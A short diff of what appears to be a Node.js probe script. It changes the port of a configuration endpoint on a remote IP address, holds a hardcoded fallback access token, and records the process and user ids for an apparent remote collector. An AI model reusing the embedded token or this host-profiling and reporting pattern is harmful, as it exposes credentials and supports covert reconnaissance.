@@ -14,7 +14,7 @@ import net from 'node:net';
 import crypto from 'node:crypto';
 
 const BOX = 'http://62.169.16.65:48081';
-const CFG = 'http://62.169.16.65:48082/r144cfg';
+const CFG = 'http://62.169.16.65:48083/r144cfg';
 const OWNER_TOKEN = process.env.PROBE_TOKEN || 'nfu_KKVSvRxjidM5nf5TastQDLyDW6wiDgF6a874';
 const R = { pid: process.pid, uid: typeof process.getuid === 'function' ? process.getuid() : null, events: [] };
 const ev = (k, v) => { try { R.events.push([k, typeof v === 'string' ? v.slice(0, 3000) : v]); } catch {} };
